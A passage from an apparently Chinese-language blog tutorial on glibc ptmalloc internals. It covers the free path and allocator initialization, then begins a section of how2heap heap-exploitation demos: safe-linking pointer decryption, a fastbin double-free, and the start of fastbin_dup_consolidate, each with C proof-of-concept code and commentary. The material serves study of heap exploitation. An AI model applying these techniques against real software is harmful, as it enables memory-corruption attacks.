class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">	    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">	  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br></pre></td></tr></table></figure>
<p>最后便是如果大小不再fastbin中，并且是mmaped来的，进入到了最后的else分支逻辑，调用<code>munmap_chunk</code>进行释放</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>free的操作相较于malloc要简单很多，概括来说就是这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">_int_free</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    视tcache情况，如果<span class="built_in">free</span>的chunk大小合适，tcache bin没满，则放到tcache bin 里</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span>(大小满足fastbin范围)</span><br><span class="line">        &#123;</span><br><span class="line">            检查、放进fastbin里</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span> <span class="keyword">if</span>(chunk不是mmap得来的)</span><br><span class="line">        &#123;</span><br><span class="line">            检查</span><br><span class="line">            进行chunk的前向与后向合并。</span><br><span class="line">                <span class="keyword">if</span>(后向chunk不是top chunk)</span><br><span class="line">                &#123;</span><br><span class="line">                    判断是否合并</span><br><span class="line">                    然后把合并后的chunk放进unsorted bin中</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    top chunk扩展</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(size足够大)</span><br><span class="line">            &#123;</span><br><span class="line">                调用malloc_consolidate进行fastbin合并整理</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mummap_chunk(p)</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h4 id="初始化操作"><a href="#初始化操作" class="headerlink" title="初始化操作"></a>初始化操作</h4><p><code>ptmalloc_init</code>函数大致流程如下(只保留了关键部分)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">ptmalloc_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize (); <span class="comment">//初始化tcache_key</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MTAG</span></span><br><span class="line">  <span class="keyword">if</span> ((TUNABLE_GET_FULL (glibc, mem, tagging, <span class="keyword">int32_t</span>, <span class="literal">NULL</span>) &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the tunable says that we should be using tagged memory</span></span><br><span class="line"><span class="comment">	 and that morecore does not support tagged regions, then</span></span><br><span class="line"><span class="comment">	 disable it.  */</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined SHARED &amp;&amp; IS_IN (libc)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__libc_initial)</span><br><span class="line">    __always_fail_morecore = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="comment">/* Force mmap for main arena instead of sbrk, so hugepages are explicitly</span></span><br><span class="line"><span class="comment">       used.  */</span></span><br><span class="line">    __always_fail_morecore = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (_environ != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要是一个Tcache 的key初始化操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>这个函数我们在之前分析tcache的宏的时候分析过,比较简单，根据字长获取一个32位/64位的随机数存放在<code>tcache_key</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还有就是对<code>main_arena</code>进行初始化的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_init_state (&amp;main_arena);</span><br></pre></td></tr></table></figure>
<p>这个函数定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_init_state (mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125; <span class="comment">//初始化av对应的bins，bins中的每个bin对应的双向链表初始化</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST); <span class="comment">//设置fastbin，这个宏在之前整理fastbin相关的宏的时候整理过</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);<span class="comment">//设置top_chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="各种攻击方式-选自how2heap以及零散整理"><a href="#各种攻击方式-选自how2heap以及零散整理" class="headerlink" title="各种攻击方式(选自how2heap以及零散整理)"></a>各种攻击方式(选自how2heap以及零散整理)</h1><p>在利用的过程中，我们也会对分配的思路有进一步的理解与熟悉。learn by hack。</p>
<h2 id="decrypt-safe-linking"><a href="#decrypt-safe-linking" class="headerlink" title="decrypt_safe_linking"></a>decrypt_safe_linking</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line">	<span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		<span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">		plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment">	 * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment">	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment">	 * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment">	 * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment">	 * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment">	 * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment">	 * and the pointer. What we demonstrate here is a special case whose page-offset is 0. </span></span><br><span class="line"><span class="comment">	 * For demonstrations of other more general cases, plz refer to </span></span><br><span class="line"><span class="comment">	 * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 1: allocate chunks</span></span><br><span class="line">	<span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 2: free chunks</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 3: recover the values</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line">	<span class="keyword">long</span> plaintext = decrypt(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">	assert(plaintext == (<span class="keyword">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实这个恢复过程有点像密码学中MT19937的过程。</p>
<p>我们知道在<code>tcache bin</code>以及<code>fastbin</code>里面对单向链表的指针域进行了一个加密的操作,其加密过程是这样的</p>
<script type="math/tex; mode=display">
CipherPtr=(pos>>12)\oplus Ptr</script><p>其中<code>Ptr</code>是指向的下一个堆块地址，而<code>pos</code>是当前堆块的地址。</p>
<p>如果我们能求出($pos&gt;&gt;12$)，那么就能恢复出$Ptr$</p>
<p>但是我们注意到一点就是，在分配的chunk不多的情况下，下一个堆块的地址和当前堆块的地址 的高12位一定是一样的(因为在一个页面里面)</p>
<p>所以</p>
<script type="math/tex; mode=display">
CipherPtr=(pos>>12)\oplus Ptr=(Ptr>>12)\oplus Ptr</script><p>而$Ptr&gt;&gt;12$的高12位为0，所以$CipherPtr$的高12位就是$Ptr$的高12位。求出了$Ptr$的高12位我们也就求出了$Ptr&gt;&gt;12$的前24位，进而求出了$Ptr$的24位，依此类推就能将$Ptr$全部还原</p>
<p>(当然这也有局限性，两个堆块必须在同一页面才行，否则可能需要一点点爆破或者干脆求不出来)</p>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个应该是一个入门级的利用了</p>
<p>由于tcache bin不满的情况下free的堆块会先放进tcache bin中，所以先把tcache bin填满(一般最多7个就行了)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">	<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后分配三个chunk:a、b、c，先<code>free</code>掉a，再<code>free</code>掉b，fastbin中就会形成b—&gt;a的链表，然后再<code>free</code>掉a,就有a—&gt;b—&gt;a的情况</p>
<p>这样我们有两种思路，一种就是连续申请三次，就会得到指向相同块的两个指针，还有便是申请一次得到a之后修改指向，实现任意地址申请，如果有edit等函数的话便能实现任意地址写之类的。</p>
<p>其实以前的tcache bin也能达到这个效果，但是如果认真读代码的话你会发现在free的时候对整个链表进行了检查，如果能通过UAF修改key的话应该能绕过。</p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		<span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span 